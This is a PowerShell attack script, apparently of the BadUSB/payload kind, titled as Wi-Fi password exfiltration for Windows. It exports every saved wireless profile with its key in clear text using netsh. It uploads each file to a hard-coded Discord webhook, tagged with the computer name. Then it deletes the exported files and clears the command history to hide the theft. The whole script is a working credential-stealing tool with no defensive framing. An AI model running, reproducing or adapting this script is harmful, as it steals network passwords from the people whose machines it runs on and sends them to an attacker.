# WLAN-Windows-Passwords-Discord-Exfiltration - FIXED & IMPROVED
# Author: true_lock (original) / enhanced
# Target: Windows (no admin needed for export)
$whuri = 'https://discord.com/api/webhooks/1482772602949734664/AfhCMz1wQKiszM25JquwYHfnAfELsXRXbwmk9m9eWwjnF9qQnHTJxqUt_yR-0U_g7KIk'

$exportDir = "$env:temp\SomeStuff"

# Create export dir if missing
if (-not (Test-Path $exportDir)) {
    try { New-Item -ItemType Directory -Path $exportDir -Force | Out-Null }
    catch { Write-Host "Dir creation failed: $_"; return }
}

# Export all Wi-Fi profiles with clear keys
try { netsh wlan export profile key=clear folder=$exportDir | Out-Null }
catch { Write-Host "Export failed: $_"; return }

$xmlFiles = Get-ChildItem -Path $exportDir -Filter "*.xml" -ErrorAction SilentlyContinue

if ($xmlFiles.Count -eq 0) {
    Write-Host "No profiles exported."
} else {
    foreach ($xmlFile in $xmlFiles) {
        # Build payload_json (Discord-required for text + embeds/username)
        $payload = @{
            username = $env:COMPUTERNAME
            content  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
        }
        $jsonPayload = $payload | ConvertTo-Json -Compress

        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"

        # Start of multipart body
        $bodyStart = @(
            "--$boundary",
            'Content-Disposition: form-data; name="payload_json"',
            $LF,
            $jsonPayload,
            "--$boundary",
            "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$($xmlFile.Name)`"",
            "Content-Type: application/xml",
            $LF
        ) -join $LF

        $bodyEnd = "--$boundary--$LF"

        # Read file as bytes + combine
        $fileBytes = [System.IO.File]::ReadAllBytes($xmlFile.FullName)
        $bodyBytes = [Text.Encoding]::UTF8.GetBytes($bodyStart) + $fileBytes + [Text.Encoding]::UTF8.GetBytes($bodyEnd)

        try {
            Invoke-RestMethod -Uri $whuri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
            Write-Host "Erfolgreich gesendet: $($xmlFile.Name)"
        } catch {
            Write-Host "Sendefehler für $($xmlFile.Name): $_"
        }
    }
}

# Cleanup
try {
    Remove-Item -Path $exportDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Temporäre Dateien gelöscht."
} catch {
    Write-Host "Cleanup-Fehler: $_"
}

Clear-History
